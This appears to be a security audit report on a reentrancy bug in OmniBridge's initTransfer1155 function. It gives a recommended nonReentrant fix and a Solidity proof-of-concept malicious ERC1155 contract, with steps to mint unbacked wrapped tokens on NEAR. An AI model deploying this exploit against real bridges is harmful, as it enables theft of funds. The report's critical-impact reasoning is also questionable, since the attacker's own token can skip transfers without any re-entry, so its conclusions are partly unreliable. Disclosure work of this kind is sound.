### Title
Reentrancy in `OmniBridge.initTransfer1155` Enables Minting of Unbacked Wrapped Tokens on NEAR — (File: evm/src/omni-bridge/contracts/OmniBridge.sol)

---

### Summary

`OmniBridge.initTransfer1155` makes an external call to an attacker-supplied ERC1155 contract address with no reentrancy guard. A malicious ERC1155 can re-enter `initTransfer1155` during `safeTransferFrom`, causing the shared `currentOriginNonce` storage variable to be mutated mid-execution. Both the re-entrant and outer invocations ultimately emit `InitTransfer` with the same nonce and zero tokens actually locked. The NEAR bridge processes the first event and mints wrapped tokens for the attacker; the second is rejected as a duplicate nonce. Net result: one valid-looking `InitTransfer` event is settled on NEAR with no ERC1155 collateral ever held by OmniBridge.

---

### Finding Description

`initTransfer1155` in `OmniBridge.sol` follows this sequence: [1](#0-0) 

1. **Line 448** — `currentOriginNonce += 1` (storage write, nonce becomes N).
2. **Line 458** — `IERC1155(tokenAddress).safeTransferFrom(msg.sender, address(this), tokenId, amount, "")` — external call to an **attacker-controlled** contract.
3. **Lines 480–489** — `emit BridgeTypes.InitTransfer(…, currentOriginNonce, …)` — emitted **after** the external call, reading `currentOriginNonce` from storage at that moment.

There is no `nonReentrant` modifier anywhere in the EVM contracts: [2](#0-1) 

The `tokenAddress` parameter is fully attacker-controlled — `initTransfer1155` imposes no whitelist on which ERC1155 contract is called. A malicious ERC1155 can implement `safeTransferFrom` to:

1. Re-enter `initTransfer1155` (inner call).
2. Return without actually transferring any tokens.

**Execution trace (single re-entry depth):**

| Step | `currentOriginNonce` | Action |
|------|----------------------|--------|
| Outer call enters | N-1 → **N** | `currentOriginNonce += 1` |
| Outer calls `safeTransferFrom` | N | External call to malicious ERC1155 |
| Inner (re-entrant) call enters | N → **N+1** | `currentOriginNonce += 1` |
| Inner calls `safeTransferFrom` | N+1 | Malicious ERC1155 returns, no tokens transferred |
| Inner emits `InitTransfer` | **N+1** | `currentOriginNonce` read from storage = N+1 |
| Inner call returns | N+1 | |
| Outer `safeTransferFrom` returns | N+1 | Malicious ERC1155 returns, no tokens transferred |
| Outer emits `InitTransfer` | **N+1** | `currentOriginNonce` read from storage = N+1 (same!) |

Both events carry nonce **N+1**; nonce **N** is never emitted. The NEAR bridge processes the first N+1 event and mints wrapped tokens; the second N+1 event is rejected as a duplicate nonce via `finalised_transfers`.

The NEAR `fin_transfer_callback` only validates that the emitter address is a registered factory and that the token has registered decimals: [3](#0-2) 

Both conditions are satisfiable by the attacker: `logMetadata1155` is permissionless and registers any ERC1155 token, causing the NEAR side to deploy a wrapped token and record decimals. The emitter address is OmniBridge itself (the registered factory), so the factory check passes.

The `InitTransfer` EVM event is parsed directly from log fields with no on-chain collateral verification: [4](#0-3) 

---

### Impact Explanation

**Critical.** An attacker can mint an arbitrary quantity of wrapped ERC1155 tokens on NEAR without locking any collateral on EVM. This breaks the 1:1 backing guarantee of the bridge, inflating wrapped token supply with no corresponding locked assets. The attacker can then redeem or trade the unbacked wrapped tokens, draining real value from the bridge's liquidity.

---

### Likelihood Explanation

**High.** The entry point is fully permissionless — any EOA can deploy a malicious ERC1155 and call `initTransfer1155`. The only setup step (`logMetadata1155`) is also permissionless. No privileged role, leaked key, or external dependency compromise is required.

---

### Recommendation

Add OpenZeppelin's `ReentrancyGuardUpgradeable` to `OmniBridge` and apply `nonReentrant` to both `initTransfer1155` and `initTransfer`. The `finTransfer` function already marks the nonce before external calls (CEI pattern), but `initTransfer` is also exposed to ERC777-style `tokensToSend` hooks on the sender side and should be guarded for defense-in-depth.

```solidity
// OmniBridge.sol
import {ReentrancyGuardUpgradeable} from
    "@openzeppelin/contracts-upgradeable/utils/ReentrancyGuardUpgradeable.sol";

contract OmniBridge is
    UUPSUpgradeable,
    AccessControlUpgradeable,
    SelectivePausableUpgradable,
    ReentrancyGuardUpgradeable,   // add
    IERC1155Receiver
{ ... }

function initTransfer1155(...) external payable
    whenNotPaused(PAUSED_INIT_TRANSFER)
    nonReentrant   // add
{ ... }

function initTransfer(...) external payable
    whenNotPaused(PAUSED_INIT_TRANSFER)
    nonReentrant   // add
{ ... }
```

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC1155} from "@openzeppelin/contracts/token/ERC1155/IERC1155.sol";

interface IOmniBridge {
    function initTransfer1155(
        address tokenAddress,
        uint256 tokenId,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message
    ) external payable;
}

contract MaliciousERC1155 {
    IOmniBridge public bridge;
    bool private _entered;

    constructor(address bridge_) { bridge = IOmniBridge(bridge_); }

    // Called by OmniBridge.initTransfer1155 → IERC1155.safeTransferFrom
    function safeTransferFrom(
        address, address, uint256 tokenId, uint256 amount, bytes calldata
    ) external {
        if (!_entered) {
            _entered = true;
            // Re-enter: nonce increments to N+1, inner InitTransfer emitted
            bridge.initTransfer1155(
                address(this), tokenId, uint128(amount),
                0, 0, "near:attacker.near", ""
            );
            _entered = false;
        }
        // Return without transferring any tokens — no revert, no actual transfer
    }

    // Minimal ERC1155 stubs to satisfy interface checks
    function balanceOf(address, uint256) external pure returns (uint256) { return 1e18; }
    function isApprovedForAll(address, address) external pure returns (bool) { return true; }
    function supportsInterface(bytes4) external pure returns (bool) { return true; }
}
```

**Steps:**
1. Deploy `MaliciousERC1155(omniBridgeAddress)`.
2. Call `OmniBridge.logMetadata1155(maliciousERC1155, tokenId)` — permissionless; NEAR side deploys a wrapped token and records decimals.
3. Call `OmniBridge.initTransfer1155(maliciousERC1155, tokenId, 100, 0, 0, "near:attacker.near", "")`.
4. Re-entry fires: inner call increments nonce to N+1, emits `InitTransfer(nonce=N+1, amount=100)` — zero tokens locked.
5. Outer call emits `InitTransfer(nonce=N+1, amount=100)` again — zero tokens locked.
6. NEAR relayer submits proof of the first N+1 event; `fin_transfer_callback` mints 100 wrapped tokens to `attacker.near`.
7. Second N+1 event is rejected as duplicate. Nonce N is permanently skipped.
8. Attacker holds 100 wrapped tokens backed by zero ERC1155 collateral.

### Citations

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L1-22)
```text
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.24;

import {AccessControlUpgradeable} from "@openzeppelin/contracts-upgradeable/access/AccessControlUpgradeable.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import {Strings} from "@openzeppelin/contracts/utils/Strings.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {IERC1155} from "@openzeppelin/contracts/token/ERC1155/IERC1155.sol";
import {IERC1155Receiver} from "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";
import {IERC165} from "@openzeppelin/contracts/utils/introspection/IERC165.sol";
import {ICustomMinter} from "../../common/ICustomMinter.sol";
import {IBridgeToken} from "../../common/IBridgeToken.sol";

import "./BridgeToken.sol";
import "./SelectivePausableUpgradable.sol";
import "../../common/Borsh.sol";
import "./BridgeTypes.sol";

```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L447-490)
```text
    ) external payable whenNotPaused(PAUSED_INIT_TRANSFER) {
        currentOriginNonce += 1;
        if (fee >= amount) {
            revert InvalidFee();
        }

        address deterministicToken = deriveDeterministicAddress(
            tokenAddress,
            tokenId
        );

        IERC1155(tokenAddress).safeTransferFrom(
            msg.sender,
            address(this),
            tokenId,
            amount,
            ""
        );

        uint256 extensionValue = msg.value - nativeFee;

        initTransferExtension(
            msg.sender,
            deterministicToken,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message,
            extensionValue
        );

        emit BridgeTypes.InitTransfer(
            msg.sender,
            deterministicToken,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message
        );
    }
```

**File:** near/omni-bridge/src/lib.rs (L709-722)
```rust
        let Ok(ProverResult::InitTransfer(init_transfer)) = Self::decode_prover_result(0) else {
            env::panic_str(BridgeError::InvalidProofMessage.to_string().as_str())
        };
        require!(
            self.factories
                .get(&init_transfer.emitter_address.get_chain())
                == Some(init_transfer.emitter_address),
            BridgeError::UnknownFactory.as_ref()
        );

        let decimals = self
            .token_decimals
            .get(&init_transfer.token)
            .near_expect(BridgeError::TokenDecimalsNotFound);
```

**File:** near/omni-types/src/evm/events.rs (L115-135)
```rust
impl TryFromLog<Log<InitTransfer>> for InitTransferMessage {
    type Error = String;

    fn try_from_log(chain_kind: ChainKind, event: Log<InitTransfer>) -> Result<Self, Self::Error> {
        Ok(Self {
            emitter_address: OmniAddress::new_from_evm_address(
                chain_kind,
                H160(event.address.into()),
            )?,
            origin_nonce: event.data.originNonce,
            token: OmniAddress::new_from_evm_address(chain_kind, H160(event.tokenAddress.into()))?,
            amount: near_sdk::json_types::U128(event.data.amount),
            recipient: event.data.recipient.parse().map_err(stringify)?,
            fee: Fee {
                fee: near_sdk::json_types::U128(event.data.fee),
                native_fee: near_sdk::json_types::U128(event.data.nativeTokenFee),
            },
            sender: OmniAddress::new_from_evm_address(chain_kind, H160(event.data.sender.into()))?,
            msg: event.data.message,
        })
    }
```
